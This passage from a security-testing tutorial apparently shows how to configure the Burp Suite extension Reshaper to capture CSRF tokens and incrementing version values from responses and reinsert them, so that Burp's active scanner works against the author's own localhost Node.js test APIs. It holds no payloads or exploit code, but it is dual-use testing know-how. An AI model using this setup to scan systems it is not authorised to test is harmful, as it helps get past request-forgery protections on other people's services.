&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Name is required&amp;#39;&lt;/span&gt; });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;users&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;);  &lt;span style=&#34;color:#75715e&#34;&gt;// Storing the name in &amp;#34;database&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newToken&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;uuidv4&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;csrfTokens&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;newToken&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CSRF-Token&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;newToken&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// Provide a valid CSRF token in response header
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;201&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;User added&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Starting the server
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PORT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;process&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;env&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PORT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3000&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;listen&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;PORT&lt;/span&gt;, () =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Server running on http://localhost:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PORT&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The end-user can send a JSON formatted POST body to &lt;code&gt;/user&lt;/code&gt; endpoint which adds
a name to the in-memory database. The request will only be successful if the
end-user provides
CSRF token which is randomly generated and returned to the user as a HTTP response
header.&lt;/p&gt;
&lt;p&gt;If we would want to use Burp&amp;rsquo;s built in active scanner to look for vulnerabilities
this would be a problem as we need to provide the CSRF token upon each
request.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;burps-built-int-scanner-having-issues-with-version-value-csrf.png&#34; alt=&#34;burps-built-int-scanner-having-issues-with-version-value&#34;&gt;&lt;/p&gt;
&lt;p&gt;To circumvent this problem we create a new Reshaper rule called
&amp;ldquo;set_csrf_variable&amp;rdquo; and configure the &lt;em&gt;Whens&lt;/em&gt; with &lt;em&gt;Request Direction = Response&lt;/em&gt;
and actions as the example shown in the following table:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Whens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Identifier&lt;/th&gt;
&lt;th&gt;Identifier Placement&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Match Type&lt;/th&gt;
&lt;th&gt;Match Text&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Response&lt;/td&gt;
&lt;td&gt;Matches Text&lt;/td&gt;
&lt;td&gt;Response Header&lt;/td&gt;
&lt;td&gt;CSRF-Token&lt;/td&gt;
&lt;td&gt;Last&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Regex&lt;/td&gt;
&lt;td&gt;.+&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The Regexp &lt;code&gt;.+&lt;/code&gt; matches any sequence of characters that is at least one
character long which makes sure the Response Header &lt;code&gt;CSRF-Token&lt;/code&gt; is not
empty.&lt;/p&gt;
&lt;p&gt;For the &lt;em&gt;Thens&lt;/em&gt; part we want to store our CSRF-Token in a variable:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Identifier&lt;/th&gt;
&lt;th&gt;Identifier Placement&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Destination Variable Source&lt;/th&gt;
&lt;th&gt;Destination Variable Name&lt;/th&gt;
&lt;th&gt;Destination Variable Name&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Variable&lt;/td&gt;
&lt;td&gt;Response Header&lt;/td&gt;
&lt;td&gt;CSRF-Token&lt;/td&gt;
&lt;td&gt;Last&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Global&lt;/td&gt;
&lt;td&gt;csrf_variable&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;This rule will, for every response that has &lt;code&gt;CSRF-Token&lt;/code&gt; set as a header,
fetch the token value and save it to a variable named &lt;code&gt;csrf_variable&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The result should look like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-example-for-setting-a-variable-csrf.png&#34; alt=&#34;reshaper-example-for-setting-a-variable&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now, when sending a request to the server via Burp, a variable will be created
or updated in the &lt;em&gt;Global Variables&lt;/em&gt; sub tab of Reshaper:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-variable-set-csrf.png&#34; alt=&#34;reshaper-variable-set&#34;&gt;&lt;/p&gt;
&lt;p&gt;Next step is to use this &lt;code&gt;csrf_variable&lt;/code&gt; in subsequent request. We
do by creating a new rule called &lt;code&gt;set_csrf&lt;/code&gt; with event direction request and by using the
&lt;em&gt;Set Value&lt;/em&gt; as a &lt;em&gt;Whens&lt;/em&gt; action according to the following tables:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Whens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Match Type&lt;/th&gt;
&lt;th&gt;Match Text&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Request&lt;/td&gt;
&lt;td&gt;Matches Text&lt;/td&gt;
&lt;td&gt;URL&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Equals&lt;/td&gt;
&lt;td&gt;http://localhost:3000/user&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Source Text&lt;/th&gt;
&lt;th&gt;Source Type Value&lt;/th&gt;
&lt;th&gt;Destination Message Value&lt;/th&gt;
&lt;th&gt;Destination Identifier&lt;/th&gt;
&lt;th&gt;Destination Identifier Placement&lt;/th&gt;
&lt;th&gt;Destination Type Value&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Value&lt;/td&gt;
&lt;td&gt;{{g:csrf_variable}}&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Request Header&lt;/td&gt;
&lt;td&gt;CSRF-Token&lt;/td&gt;
&lt;td&gt;Only&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The result should look like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-providing-csrf-token-on-each-request.png&#34; alt=&#34;reshaper-providing-csrf-token-on-each-request&#34;&gt;&lt;/p&gt;
&lt;p&gt;If all steps are followed correctly every response that contains a &lt;code&gt;CSRF-Token&lt;/code&gt;
will will be saved as a variable which will be referenced and used in all upcoming request
to &lt;code&gt;http://localhost:3000/user&lt;/code&gt;. This makes it possible to, for instance, use
Burp active scanner where CSRF tokens need to be provided.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-sucessful-usage-of-burp-active-scanner-with-csrf-tokens.png&#34; alt=&#34;reshaper-sucessful-usage-of-burp-active-scanner-with-csrf-tokens&#34;&gt;&lt;/p&gt;
&lt;p&gt;Quite powerful innit.&lt;/p&gt;
&lt;p&gt;But now you went all this way only find out that your CSRF token is provided
via cookies and not HTTP headers? Not a problem. Replace the references to
&lt;em&gt;Request Header&lt;/em&gt; and &lt;em&gt;Response Header&lt;/em&gt; to &lt;em&gt;Request Cookie&lt;/em&gt; and &lt;em&gt;Response Cookie&lt;/em&gt;.&lt;/p&gt;
&lt;h1 id=&#34;scenario-2---using-burp-to-increment-values-with-reshapers-evaluate-action&#34;&gt;Scenario 2 - Using Burp to increment values with Reshapers Evaluate action&lt;/h1&gt;
&lt;p&gt;In the previous scenario we configured Reshaper to fetch a value from a response and
the use that value in subsequent requests which works perfectly when
assessing applications with CSRF tokens.&lt;/p&gt;
&lt;p&gt;Now we will demonstrate another hurdle that Reshaper can help bypass, namely
incrementing values.&lt;/p&gt;
&lt;p&gt;For this demonstration we will yet again use an API hosted by node.js that
takes user input in JSON format and stores in memory.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// mkdir $HOME/node-api-version
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// cd $HOME/node-api-version
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// npn init -y
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// npm install express
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PORT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;process&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;env&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PORT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3000&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// In-memory storage
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userData&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;version&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;post&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/user&amp;#39;&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;version&lt;/span&gt; } &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;undefined&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;version&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;userData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;userData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;version&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;User data updated&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userData&lt;/span&gt; });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A newer version exists. Please update the version number.&amp;#34;&lt;/span&gt; });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Both name and version are required&amp;#34;&lt;/span&gt; });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;listen&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;PORT&lt;/span&gt;, () =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Server running on http://localhost:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PORT&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The end-user can send a JSON formatted POST body to &lt;code&gt;/user&lt;/code&gt; endpoint which updates the &lt;code&gt;name&lt;/code&gt;
key on the server with the provided value. The request is only successful if the end-user provides
a valid version number, which is increased every time the &lt;code&gt;name&lt;/code&gt; is updated.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /user HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 31

{
  &amp;#34;name&amp;#34;:&amp;#34;user1&amp;#34;,
  &amp;#34;version&amp;#34;:1 
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This obstacle would be a problem for Burp&amp;rsquo;s active scanner or
let alone be a time consuming task overcoming manually when using Burp&amp;rsquo;s repeater.&lt;/p&gt;
&lt;p&gt;We circumvent this by creating a new Reshaper rule called
&lt;code&gt;set_version_variable&lt;/code&gt; and configure the &lt;em&gt;Whens&lt;/em&gt;
to either of the following examples in the table which shows how to match
text or JSON key values:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Whens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Source Value Path&lt;/th&gt;
&lt;th&gt;Match Type&lt;/th&gt;
&lt;th&gt;Match Text&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Response&lt;/td&gt;
&lt;td&gt;Matching Text&lt;/td&gt;
&lt;td&gt;Response Body&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Contains&lt;/td&gt;
&lt;td&gt;&amp;ldquo;version&amp;rdquo;:&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Response&lt;/td&gt;
&lt;td&gt;Matching Text&lt;/td&gt;
&lt;td&gt;Response Body&lt;/td&gt;
&lt;td&gt;JSON&lt;/td&gt;
&lt;td&gt;data.version&lt;/td&gt;
&lt;td&gt;Regex&lt;/td&gt;
&lt;td&gt;[0-9]&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;The usage of quotation with &lt;em&gt;version&lt;/em&gt; in the first example is because we are now looking
for a string in the response body which is quoted..&lt;/li&gt;
&lt;li&gt;The reason for using &lt;em&gt;data.version&lt;/em&gt; in the second example is because the
response from the server is nested JSON, as in:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{
  &amp;#34;message&amp;#34;:&amp;#34;User data updated&amp;#34;,
  &amp;#34;data&amp;#34;:{
    &amp;#34;name&amp;#34;:&amp;#34;user&amp;#34;,
    &amp;#34;version&amp;#34;:14
  }
}
